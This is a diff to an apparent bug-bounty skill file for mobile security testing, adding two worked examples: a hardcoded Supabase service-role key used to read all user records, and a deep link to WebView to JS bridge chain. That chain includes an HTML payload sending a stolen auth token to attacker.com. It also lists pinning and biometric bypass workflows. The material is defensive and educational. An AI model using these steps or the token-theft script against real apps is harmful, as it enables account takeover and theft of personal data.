@@ -23,6 +23,97 @@ Security testing patterns for mobile applications — iOS and Android. Covers th
 
 ---
 
+## Worked Example 1: Android Hardcoded API Key → Account Takeover
+
+**Scenario:** Android fintech app with Firebase backend. Program scope includes mobile apps.
+
+**Step 1 — Extract secrets from APK:**
+```
+jadx -d output target.apk
+grep -rn "AIza\|AKIA\|sk-\|pk_live_\|service_role\|supabase" output/
+# Found: SUPABASE_URL = "https://xyzabc.supabase.co"
+# Found: SUPABASE_ANON_KEY = "eyJhbGciOi..." (expected — anon keys are public)
+# Found: SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOi..." (CRITICAL — never in client)
+```
+
+**Step 2 — Verify service role key grants admin access:**
+```
+curl "https://xyzabc.supabase.co/rest/v1/users?select=*" \
+  -H "apikey: <SERVICE_ROLE_KEY>" \
+  -H "Authorization: Bearer <SERVICE_ROLE_KEY>"
+# Response: 200 OK — returns ALL user records (emails, hashed passwords, PII)
+```
+
+**Step 3 — Confirm write access (non-destructive):**
+```
+# Test insert to a test table — or confirm via Supabase dashboard if available
+# The service_role key bypasses ALL Row Level Security policies
+```
+
+**Finding:** Service role key hardcoded in Android binary grants full database admin access — read all user data, modify records, delete tables. **Severity: Critical (CVSS 9.8).** The key bypasses all RLS policies. Remediation: rotate the key immediately, move it to server-side only.
+
+**Why this paid $2,000+:** Service role keys are unambiguously critical — they bypass all access controls. The proof was a single curl command returning real PII. No chaining needed.
+
+---
+
+## Worked Example 2: Deep Link → WebView XSS → Token Theft
+
+**Scenario:** E-commerce Android app with deep link handling. WebView loads URLs from intent data.
+
+**Step 1 — Identify exported deep link handler:**
+```
+# From AndroidManifest.xml:
+# <activity android:name=".DeepLinkActivity" android:exported="true">
+#   <intent-filter>
+#     <action android:name="android.intent.action.VIEW" />
+#     <data android:scheme="shopapp" android:host="product" />
+#   </intent-filter>
+# </activity>
+```
+
+**Step 2 — Trace the deep link handler in decompiled code (jadx):**
+```java
+// DeepLinkActivity.java
+String url = getIntent().getData().getQueryParameter("url");
+webView.loadUrl(url);  // No validation — loads any URL in WebView with JS enabled
+```
+
+**Step 3 — Craft exploit deep link:**
+```
+adb shell am start -a android.intent.action.VIEW \
+  -d "shopapp://product?url=https://attacker.com/steal.html"
+```
+
+**Step 4 — Steal auth token via JavaScript bridge:**
+```html
+<!-- steal.html hosted on attacker.com -->
+<script>
+// WebView has addJavascriptInterface("AppBridge") with getAuthToken() method
+var token = AppBridge.getAuthToken();
+fetch('https://attacker.com/collect?token=' + token);
+</script>
+```
+
+**Finding:** Attacker-controlled URL loaded in WebView with JavaScript bridge access. Victim clicks a crafted link → attacker steals auth token → full account takeover. **Severity: High-Critical** (preconditions: WebView must load attacker URLs AND JS bridge must expose sensitive methods like `getAuthToken()`). Remediation: validate URLs against allowlist before loading in WebView; restrict JS bridge methods.
+
+**Why this approach works:** Most hunters stop at "exported activity found" (Low). Chaining deep link → WebView → JS bridge → token theft transforms it to High-Critical. The PoC requires a realistic attack scenario: victim receives the link via SMS/email.
+
+---
+
+## Exploitation Workflows
+
+> **Full procedures:** See [reference/mobile-exploitation-workflows.md](reference/mobile-exploitation-workflows.md) for Frida hooking scripts, certificate pinning bypass step-by-step, Objection commands, iOS keychain testing, and secret extraction workflows.
+
+| Workflow | When to Use | Key Tool |
+|----------|-------------|----------|
+| **Certificate pinning bypass** | App rejects proxy CA — need to intercept HTTPS traffic | Frida/Objection |
+| **Secret extraction** | Static analysis found encrypted/obfuscated secrets | Frida memory dump |
+| **Biometric bypass** | App uses fingerprint/face auth with client-side check | Frida hook |
+| **iOS keychain audit** | iOS app stores tokens — check accessibility flags | Objection |
+| **Runtime method hooking** | Need to modify app behavior without recompilation | Frida |
+
+---
+
 ## Static Analysis
 
 ### Android (APK)
@@ -174,7 +265,7 @@ Mobile apps often have API-specific vulnerabilities because developers assume th
 | 3 | Internal storage files | Check `/data/data/{app}/files/` | Config files, cached responses |
 | 4 | External storage | Check `/sdcard/Android/data/{app}/` | World-readable on older Android |
 | 5 | Cache directory | Check `/data/data/{app}/cache/` | Cached API responses with sensitive data |
-| 6 | Backup extraction | `adb backup -f backup.ab {package}` | Sensitive data in backups if `allowBackup="true"` |
+| 6 | Backup extraction | `adb backup` (restricted on Android 12+ / API 31+ unless debuggable); test Auto Backup XML config instead | Sensitive data in backups if `allowBackup="true"` |
 | 7 | Logcat | `adb logcat \| grep {package}` | Sensitive data logged to system log |
 | 8 | Clipboard data | Monitor clipboard programmatically | Passwords or tokens copied to clipboard |
 
@@ -340,13 +431,14 @@ This skill uses progressive disclosure. Detailed reference material is available
 
 | File | Contents | Lines |
 |------|----------|-------|
-| [reference/baas-security.md](reference/baas-security.md) | Firebase misconfigs (8 patterns + testing workflow + severity escalation), Supabase misconfigs (6 patterns + RLS testing), in-app purchase manipulation (5 patterns + StoreKit 2/Play Billing notes), BaaS severity guidelines, active mobile threats (CVE-2026-21385 Qualcomm, March 2026 Android update, iOS zero-days), common BaaS report mistakes | ~160 |
+| [reference/baas-security.md](reference/baas-security.md) | Firebase misconfigs (8 patterns + testing workflow + severity escalation), Supabase misconfigs (6 patterns + RLS testing), in-app purchase manipulation (5 patterns + StoreKit 2/Play Billing notes), BaaS severity guidelines, active mobile threats, common BaaS report mistakes | ~250 |
+| [reference/mobile-exploitation-workflows.md](reference/mobile-exploitation-workflows.md) | Frida certificate pinning bypass (Android + iOS step-by-step), Objection runtime commands, iOS keychain accessibility audit, secret extraction from memory, biometric bypass hooking, app patching without jailbreak/root | ~350 |
 
-**Quick search** — find specific BaaS/threat patterns:
+**Quick search** — find specific patterns:
 ```
 grep -n "Firebase\|Firestore\|firebaseio" ${CLAUDE_SKILL_DIR}/reference/baas-security.md
-grep -n "Supabase\|RLS\|service_role" ${CLAUDE_SKILL_DIR}/reference/baas-security.md
-grep -n "CVE\|zero-day\|threat\|CISA" ${CLAUDE_SKILL_DIR}/reference/baas-security.md
+grep -n "Frida\|pinning\|hook\|bypass" ${CLAUDE_SKILL_DIR}/reference/mobile-exploitation-workflows.md
+grep -n "keychain\|entitlement\|accessibility" ${CLAUDE_SKILL_DIR}/reference/mobile-exploitation-workflows.md
 ```
 
 ---
